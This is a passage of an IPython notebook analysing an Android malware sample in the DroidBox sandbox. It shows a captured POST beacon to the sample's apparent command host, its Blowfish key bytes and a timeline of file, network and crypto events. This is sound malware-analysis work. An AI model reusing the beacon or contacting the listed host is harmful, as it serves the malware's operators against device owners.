      "Pragma: no-cache\n",
      "Host: best-invest-int.com\n",
      "Connection: Keep-Alive\n",
      "Accept-Encoding: gzip\n",
      "Content-Length: 86\n",
      "Data Raw: 64 61 74 61 3d 55 32 6c 74 55 33 52 68 64 47 55 67 50 53 42 4f 54 31 51 67 55 6b 56 42 52 46 6b 67 43 67 25 33 44 25 33 44 25 30 41 26 4c 6f 67 43 6f 64 65 3d 43 4f 4e 46 26 4c 6f 67 54 65 78 74 3d 43 68 65 63 6b 2b 70 75 6c 6c 2b 6f 66 66 2b 75 72 6c 73 26 \n",
      "Data Ascii: data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&LogCode=CONF&LogText=Check+pull+off+urls&\n",
      "~~~\n",
      "\n",
      "**Response**:\n",
      "\n",
      "~~~\n",
      "HTTP/1.1 403 Forbidden\n",
      "Date: Thu, 21 Nov 2013 12:37:26 GMT\n",
      "Server: Apache/2.2.3 (CentOS)\n",
      "Content-Length: 299\n",
      "Connection: close\n",
      "Content-Type: text/html; charset=iso-8859-1\n",
      "\n",
      "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access /gallery/4.phpon this server.</p><hr><address>Apache/2.2.3 (CentOS) Server at best-invest-int.com Port 80</address></body></html>\n",
      "~~~"
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "Crypto activities"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# <!-- collapse=True -->\n",
      "# Convert timestamps to human readable time delta\n",
      "timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(\"utf-8\")))))) for i in result['cryptousage'].keys()]\n",
      "\n",
      "# Create list of accessed files entries\n",
      "crypto_usage = [i[1] for i in result['cryptousage'].items()]\n",
      "\n",
      "# Create dataframe\n",
      "df_cryptousage = pd.DataFrame(crypto_usage, index=timestamps)\n",
      "df_cryptousage.sort(inplace=True)\n",
      "df_cryptousage.index.name='Timestamp'\n",
      "\n",
      "# Unhexlify data\n",
      "#unhexed_data = [binascii.unhexlify(d) for d in df_recvnet['data']]\n",
      "#df_recvnet['rawdata'] = unhexed_data\n",
      "\n",
      "#df_recvnet[['host', 'port', 'type', 'rawdata']]\n",
      "df_cryptousage.reset_index()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\">\n",
        "<table border=\"1\" class=\"dataframe\">\n",
        "  <thead>\n",
        "    <tr style=\"text-align: right;\">\n",
        "      <th></th>\n",
        "      <th>Timestamp</th>\n",
        "      <th>algorithm</th>\n",
        "      <th>key</th>\n",
        "      <th>operation</th>\n",
        "      <th>type</th>\n",
        "    </tr>\n",
        "  </thead>\n",
        "  <tbody>\n",
        "    <tr>\n",
        "      <th>0</th>\n",
        "      <td> 0:00:09</td>\n",
        "      <td> Blowfish</td>\n",
        "      <td> 52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...</td>\n",
        "      <td> keyalgo</td>\n",
        "      <td> crypto</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>1</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td> Blowfish</td>\n",
        "      <td> 52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...</td>\n",
        "      <td> keyalgo</td>\n",
        "      <td> crypto</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>2</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td> Blowfish</td>\n",
        "      <td> 52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...</td>\n",
        "      <td> keyalgo</td>\n",
        "      <td> crypto</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>3</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td> Blowfish</td>\n",
        "      <td> 52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...</td>\n",
        "      <td> keyalgo</td>\n",
        "      <td> crypto</td>\n",
        "    </tr>\n",
        "  </tbody>\n",
        "</table>\n",
        "</div>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 417,
       "text": [
        "  Timestamp algorithm                                                                                                  key operation    type\n",
        "0   0:00:09  Blowfish  52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...   keyalgo  crypto\n",
        "1   0:15:06  Blowfish  52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...   keyalgo  crypto\n",
        "2   0:15:36  Blowfish  52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...   keyalgo  crypto\n",
        "3   0:16:00  Blowfish  52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...   keyalgo  crypto"
       ]
      }
     ],
     "prompt_number": 417
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "Activities chart"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Now let's have a look in which *order* the several activities took place. Below you'll find a table containing the timestamp, operation and category of each specific activity (e.g. file system access, network read/write etc.)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# <!-- collapse=True -->\n",
      "# Create df\n",
      "df_activities = pd.DataFrame(columns=[['Timestamp', 'Operation', 'Category']])\n",
      "\n",
      "# file system access\n",
      "accessed_files = df_accessedfiles.reset_index()[[0,3]]\n",
      "accessed_files['Category'] = \"file system\"\n",
      "accessed_files.columns = ['Timestamp', 'Operation', 'Category']\n",
      "\n",
      "# network activities\n",
      "network_open = df_opennet.reset_index()[[0]]\n",
      "network_open['Operation'] = 'net open'\n",
      "network_open['Category'] = 'network'\n",
      "network_open.columns = ['Timestamp', 'Operation', 'Category']\n",
      "\n",
      "network_sent = df_sendnet.reset_index()[[0,6]]\n",
      "network_sent['Category'] = \"network\"\n",
      "network_sent.columns = ['Timestamp', 'Operation', 'Category']\n",
      "\n",
      "network_recv = df_recvnet.reset_index()[[0,4]]\n",
      "network_recv['Category'] = \"network\"\n",
      "network_recv.columns = ['Timestamp', 'Operation', 'Category']\n",
      "\n",
      "# crpyto usage\n",
      "crypto_usage = df_cryptousage.reset_index()[[0,1]]\n",
      "crypto_usage['Category'] = \"crypto\"\n",
      "crypto_usage.columns = ['Timestamp', 'Operation', 'Category']\n",
      "\n",
      "# Merge data frames\n",
      "df_activities = pd.concat([accessed_files, network_open, network_sent, network_recv, crypto_usage], ignore_index=True)\n",
      "df_activities.sort('Timestamp', inplace=True)\n",
      "\n",
      "# Convert to JSON\n",
      "d = df_activities.to_json(orient='records')\n",
      "json_data = json.dumps(json.loads(d), ensure_ascii=False).encode(\"utf-8\")\n",
      "\n",
      "df_activities"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\">\n",
        "<table border=\"1\" class=\"dataframe\">\n",
        "  <thead>\n",
        "    <tr style=\"text-align: right;\">\n",
        "      <th></th>\n",
        "      <th>Timestamp</th>\n",
        "      <th>Operation</th>\n",
        "      <th>Category</th>\n",
        "    </tr>\n",
        "  </thead>\n",
        "  <tbody>\n",
        "    <tr>\n",
        "      <th>0 </th>\n",
        "      <td> 0:00:03</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>1 </th>\n",
        "      <td> 0:00:04</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>2 </th>\n",
        "      <td> 0:00:04</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>3 </th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>21</th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td>  net open</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>25</th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td> net write</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>29</th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td>  net read</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>30</th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td>  net read</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>4 </th>\n",
        "      <td> 0:00:09</td>\n",
        "      <td>     write</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>37</th>\n",
        "      <td> 0:00:09</td>\n",
        "      <td>  Blowfish</td>\n",
        "      <td>      crypto</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>5 </th>\n",
        "      <td> 0:00:10</td>\n",
        "      <td>     write</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>6 </th>\n",
        "      <td> 0:00:10</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>7 </th>\n",
        "      <td> 0:00:36</td>\n",
        "      <td>     write</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>8 </th>\n",
        "      <td> 0:00:36</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>9 </th>\n",
        "      <td> 0:01:05</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>10</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td>     write</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>11</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td>     write</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>22</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td>  net open</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>26</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td> net write</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>31</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td>  net read</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>32</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td>  net read</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>38</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td>  Blowfish</td>\n",
        "      <td>      crypto</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>12</th>\n",
        "      <td> 0:15:24</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>13</th>\n",
        "      <td> 0:15:27</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>14</th>\n",
        "      <td> 0:15:35</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>23</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td>  net open</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>27</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td> net write</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>33</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td>  net read</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>34</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td>  net read</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>39</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td>  Blowfish</td>\n",
        "      <td>      crypto</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>15</th>\n",
        "      <td> 0:15:37</td>\n",
        "      <td>     write</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>16</th>\n",
        "      <td> 0:15:37</td>\n",
        "      <td>     write</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>17</th>\n",
        "      <td> 0:15:58</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>18</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td>     write</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>24</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td>  net open</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>28</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td> net write</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>35</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td>  net read</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>36</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td>  net read</td>\n",
        "      <td>     network</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>40</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td>  Blowfish</td>\n",
        "      <td>      crypto</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>19</th>\n",
        "      <td> 0:16:01</td>\n",
        "      <td>     write</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>20</th>\n",
        "      <td> 0:16:10</td>\n",
        "      <td>      read</td>\n",
        "      <td> file system</td>\n",
        "    </tr>\n",
        "  </tbody>\n",
        "</table>\n",
        "</div>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 418,
       "text": [
        "   Timestamp  Operation     Category\n",
        "0    0:00:03       read  file system\n",
        "1    0:00:04       read  file system\n",
        "2    0:00:04       read  file system\n",
        "3    0:00:08       read  file system\n",
        "21   0:00:08   net open      network\n",
        "25   0:00:08  net write      network\n",
        "29   0:00:08   net read      network\n",
        "30   0:00:08   net read      network\n",
        "4    0:00:09      write  file system\n",
        "37   0:00:09   Blowfish       crypto\n",
        "5    0:00:10      write  file system\n",
        "6    0:00:10       read  file system\n",
        "7    0:00:36      write  file system\n",
        "8    0:00:36       read  file system\n",
        "9    0:01:05       read  file system\n",
        "10   0:15:06      write  file system\n",
        "11   0:15:06      write  file system\n",
        "22   0:15:06   net open      network\n",
        "26   0:15:06  net write      network\n",
        "31   0:15:06   net read      network\n",
        "32   0:15:06   net read      network\n",
        "38   0:15:06   Blowfish       crypto\n",
        "12   0:15:24       read  file system\n",
        "13   0:15:27       read  file system\n",
        "14   0:15:35       read  file system\n",
        "23   0:15:36   net open      network\n",
        "27   0:15:36  net write      network\n",
        "33   0:15:36   net read      network\n",
        "34   0:15:36   net read      network\n",
        "39   0:15:36   Blowfish       crypto\n",
        "15   0:15:37      write  file system\n",
        "16   0:15:37      write  file system\n",
        "17   0:15:58       read  file system\n",
        "18   0:16:00      write  file system\n",
        "24   0:16:00   net open      network\n",
        "28   0:16:00  net write      network\n",
        "35   0:16:00   net read      network\n",
        "36   0:16:00   net read      network\n",
        "40   0:16:00   Blowfish       crypto\n",
        "19   0:16:01      write  file system\n",
        "20   0:16:10       read  file system"
       ]
      }
     ],
     "prompt_number": 418
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "A fancier overview ... "
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%jinja html\n",
      "<!-- collapse=True -->\n",
      "<html>\n",
      "<head>\n",
      "  <script src=\"http://d3js.org/d3.v3.min.js\"></script>\n",
      "  <script src=\"http://dimplejs.org/dist/dimple.v2.1.0.min.js\"></script>\n",
      "<title>{{ title }}</title>\n",
      "</head>\n",
      "<body>\n",
      "<div id=\"bar_chart\"></div>\n",
      "  <script type=\"text/javascript\">\n",
      "    var json_data  = {{ json_data }};\n",
      "    var svg = dimple.newSvg(\"#bar_chart\", 800, 800);\n",
      "    var myChart = new dimple.chart(svg, json_data);\n",
      "    myChart.setBounds(150, 50, 700, 680)\n",
      "    myChart.addCategoryAxis(\"x\", [\"Category\", \"Operation\"]);\n",
      "    myChart.addCategoryAxis(\"y\", \"Timestamp\");\n",
      "    myChart.addSeries(\"Operation\", dimple.plot.bar);\n",
      "    myChart.addLegend(170, 10, 630, 20, \"right\");\n",
      "    myChart.draw();\n",
      "  </script>\n",
      "</body>\n",
      "</html>"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<!-- collapse=True -->\n",
        "<html>\n",
        "<head>\n",
        "  <script src=\"http://d3js.org/d3.v3.min.js\"></script>\n",
        "  <script src=\"http://dimplejs.org/dist/dimple.v2.1.0.min.js\"></script>\n",
        "<title></title>\n",
        "</head>\n",
        "<body>\n",
        "<div id=\"bar_chart\"></div>\n",
        "  <script type=\"text/javascript\">\n",
        "    var json_data  = [{\"Category\": \"file system\", \"Timestamp\": \"0:00:03\", \"Operation\": \"read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:00:04\", \"Operation\": \"read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:00:04\", \"Operation\": \"read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:00:08\", \"Operation\": \"read\"}, {\"Category\": \"network\", \"Timestamp\": \"0:00:08\", \"Operation\": \"net open\"}, {\"Category\": \"network\", \"Timestamp\": \"0:00:08\", \"Operation\": \"net write\"}, {\"Category\": \"network\", \"Timestamp\": \"0:00:08\", \"Operation\": \"net read\"}, {\"Category\": \"network\", \"Timestamp\": \"0:00:08\", \"Operation\": \"net read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:00:09\", \"Operation\": \"write\"}, {\"Category\": \"crypto\", \"Timestamp\": \"0:00:09\", \"Operation\": \"Blowfish\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:00:10\", \"Operation\": \"write\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:00:10\", \"Operation\": \"read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:00:36\", \"Operation\": \"write\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:00:36\", \"Operation\": \"read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:01:05\", \"Operation\": \"read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:15:06\", \"Operation\": \"write\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:15:06\", \"Operation\": \"write\"}, {\"Category\": \"network\", \"Timestamp\": \"0:15:06\", \"Operation\": \"net open\"}, {\"Category\": \"network\", \"Timestamp\": \"0:15:06\", \"Operation\": \"net write\"}, {\"Category\": \"network\", \"Timestamp\": \"0:15:06\", \"Operation\": \"net read\"}, {\"Category\": \"network\", \"Timestamp\": \"0:15:06\", \"Operation\": \"net read\"}, {\"Category\": \"crypto\", \"Timestamp\": \"0:15:06\", \"Operation\": \"Blowfish\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:15:24\", \"Operation\": \"read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:15:27\", \"Operation\": \"read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:15:35\", \"Operation\": \"read\"}, {\"Category\": \"network\", \"Timestamp\": \"0:15:36\", \"Operation\": \"net open\"}, {\"Category\": \"network\", \"Timestamp\": \"0:15:36\", \"Operation\": \"net write\"}, {\"Category\": \"network\", \"Timestamp\": \"0:15:36\", \"Operation\": \"net read\"}, {\"Category\": \"network\", \"Timestamp\": \"0:15:36\", \"Operation\": \"net read\"}, {\"Category\": \"crypto\", \"Timestamp\": \"0:15:36\", \"Operation\": \"Blowfish\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:15:37\", \"Operation\": \"write\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:15:37\", \"Operation\": \"write\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:15:58\", \"Operation\": \"read\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:16:00\", \"Operation\": \"write\"}, {\"Category\": \"network\", \"Timestamp\": \"0:16:00\", \"Operation\": \"net open\"}, {\"Category\": \"network\", \"Timestamp\": \"0:16:00\", \"Operation\": \"net write\"}, {\"Category\": \"network\", \"Timestamp\": \"0:16:00\", \"Operation\": \"net read\"}, {\"Category\": \"network\", \"Timestamp\": \"0:16:00\", \"Operation\": \"net read\"}, {\"Category\": \"crypto\", \"Timestamp\": \"0:16:00\", \"Operation\": \"Blowfish\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:16:01\", \"Operation\": \"write\"}, {\"Category\": \"file system\", \"Timestamp\": \"0:16:10\", \"Operation\": \"read\"}];\n",
        "    var svg = dimple.newSvg(\"#bar_chart\", 800, 800);\n",
        "    var myChart = new dimple.chart(svg, json_data);\n",
        "    myChart.setBounds(150, 50, 700, 680)\n",
        "    myChart.addCategoryAxis(\"x\", [\"Category\", \"Operation\"]);\n",
        "    myChart.addCategoryAxis(\"y\", \"Timestamp\");\n",
        "    myChart.addSeries(\"Operation\", dimple.plot.bar);\n",
        "    myChart.addLegend(170, 10, 630, 20, \"right\");\n",
        "    myChart.draw();\n",
        "  </script>\n",
        "</body>\n",
        "</html>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 419,
       "text": [
        "<IPython.core.display.HTML at 0x57890d0>"
       ]
      }
     ],
     "prompt_number": 419
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "A few **observations**:\n",
      "\n",
      "* file system access (both read and write) are taking place all the time\n",
      "* the crypto routines are apparently involved when sending data over internet or receiving data"
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "Conclusion"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "I think `DroidBox` is a very good tool to deal with Android APKs and analyze their behaviour during run-time. It comes with a working mobile sandbox meant to inspect and monitor an applications activities. However during my analysis I had to rely on previous analysis since the results didn't contain the full details. Not only the network traffic but also the contents read from files weren't complete. In order to fully unterstand one malware I need complete details about its behaviour.  For example I had following response from the server which is completely useless:\n",
      "\n",
      "~~~\n",
      "HTTP/1.1 406 Not Acceptable\\r\\nDate: Mon, 28 Jul 2014 13:29:38 GMT\\r\\nServer: Apache\\r\\nContent-...\n",
      "~~~\n",
      "\n",
      "Besides that I was indeed able to see that the application is reading from some file. But the delivered content was once again striped:\n",
      "\n",
      "~~~\n",
      "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<string name=\"DOWNLOADDOMAIN\">c...\n",
      "~~~\n",
      "\n",
      "I hope the developers will see this as a vital necessity and update as soon as possible. Furthermore I'll look forward to other mobile sandboxes which have data instrumentation capabilities. Next time I'll have a deeper look at Androids [DDMS](http://developer.android.com/tools/debugging/ddms.html)."
     ]
    }
   ],
   "metadata": {}
  }
 ]
}